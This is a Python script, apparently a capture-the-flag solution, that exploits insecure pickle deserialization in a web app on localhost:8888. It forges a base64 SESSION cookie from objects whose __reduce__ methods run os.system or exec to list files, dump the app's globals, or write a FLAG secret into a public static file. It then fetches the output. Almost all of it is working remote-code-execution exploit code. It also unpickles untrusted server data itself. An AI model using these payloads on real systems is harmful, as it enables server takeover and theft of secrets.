import pickle
import pickletools
import base64
import os
import requests

# import json ; f = open('foo.txt', 'wb'); f.write(json.dumps(dir()).encode('utf-8')); f.close()

# TODO: Would /proc/1/maps work?
class SystemResult(object):
    def __reduce__(self):
        return os.system, ("find / -name '*.png' > ./static/result.txt",)

class PythonResult(object):
    def __reduce__(self):
        return __builtins__.exec, ("import json ; f = open('./static/result.txt', 'wb'); f.write(json.dumps(globals(), default=lambda o: '<not serializable>').encode('utf-8')); f.close()",)

class FlagResult(object):
    def __reduce__(self):
        return __builtins__.exec, ("import base64; f = open('./static/result.txt', 'wb'); f.write(base64.b64encode(globals()['FLAG'])); f.close()",)

print("[-------------------Request------------------------]")
exploit = FlagResult()

# exploit = {'filter': 'type == "payload"'}
pickled = pickle.dumps(exploit)
forged_session = base64.b64encode(pickled).decode('utf-8')
expected_session = 'gASVIQAAAAAAAAB9lIwGZmlsdGVylIwRdHlwZSA9PSAicGF5bG9hZCKUcy4='

print(f"{forged_session=}")
print(f"{expected_session=}")

# print(pickletools.dis(pickled))
# print(f"{pickled=}")

# unpickled = pickle.loads(pickled)

# print(dir())
# print(globals())
# print(locals())

session = requests.Session()
res = session.get(
    "http://localhost:8888",
    headers= {
        'Cookie': f'SESSION={forged_session}'
    }
)

try:
    print()
    print()
    print()
    print("[-------------------Response------------------------]")
    print(res.status_code)
    print(res.headers)
    session = res.cookies.get_dict()['SESSION']

    print()
    print()
    print()
    print("[-------------------Extracted------------------------]")
    result = pickle.loads(base64.b64decode(session))
    print(result)
except:
    print()
    print()
    print()
    print("[-------------------Latest read------------------------]")
    result = requests.get("http://localhost:8888/static/result.txt")
    print(result.content.decode("utf-8"))
